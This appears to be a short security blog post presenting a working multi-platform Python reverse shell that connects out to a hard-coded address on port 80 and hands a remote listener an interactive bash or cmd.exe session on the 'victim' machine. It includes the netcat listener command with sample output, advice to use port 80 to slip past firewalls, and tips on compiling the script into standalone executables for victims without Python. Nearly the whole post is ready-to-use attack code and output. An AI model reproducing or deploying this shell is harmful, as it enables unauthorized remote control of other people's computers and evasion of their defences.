# Python Multi-Platform Reverse Shell
30.06.2020 - Author: @dorian9007

This is an easy yet powerfull Reverseshell written in Python. With this Shell you can go through the victims Firewall since the connection is 
going from the inside to the outsite.

![Image](/assets/shell.png)

### Tested on Python 3.6 under Kali Linux

```python
#!/usr/bin/python
import socket, subprocess, os, sys

# build connection
soc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
soc.connect(("192.168.1.186", 80))

# Mac OSX, Unix, Linux or Win with Cygwin
if sys.platform != "win32":
    os.dup2(soc.fileno(), 0)
    os.dup2(soc.fileno(), 1)
    os.dup2(soc.fileno(), 2)
    # Windows with Cygwin - run cmd.exe
    if sys.platform == "cygwin":
        proc = subprocess.call(["C:\Windows\System32\cmd.exe"])
    # OSX, Unix, Linux - run bash
    else:
        proc = subprocess.call(["/bin/bash", "-i"])
# Windows 
else:
    data = soc.recv(1024)
    cmd = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
    STDOUT, STDERR = cmd.communicate()
    soc.send(STDOUT)
    soc.send(STDERR)
```

<br>
For the victim to be able to properly connect with us, we need to launch a Server-Service like Netcat on our machine:
<br>
<br>

```
root@kali:~# nc -l -p 80
bash: no job control in this shell
bash-3.2$ whoami
dorian
bash-3.2$ id
uid=501(dorian) gid=20(dorian)
groups=20(staff), 501(access_bpf), 12(everyone), 61(localaccounts), 79(_appserverusr), 80(admin), 81(_appserveradm), 98(_lpadmin), 701(com.apple.sharepoint.group.1), 33(_appstore), 100(_lpoperator), 204(_developer), 395(com.apple.access_ftp), 398(com.apple.access_screensharing), 399(com.apple.access_ssh)
```

<br>
In this example -l stands for listen and -p 80 for port 80. At this point it is worth mentioning to use standart ports like 80 for HTTP which usually are not getting blocked by the Firewall.


Of course not everybody has Python already installed. For this case there are Compiler for Python like *py2exe*(Win), *cx_Freeze*(Cross-Plattform), *py2app*(OSX), or *Nuitka*(Cross-Plattform).

<br>
<br>
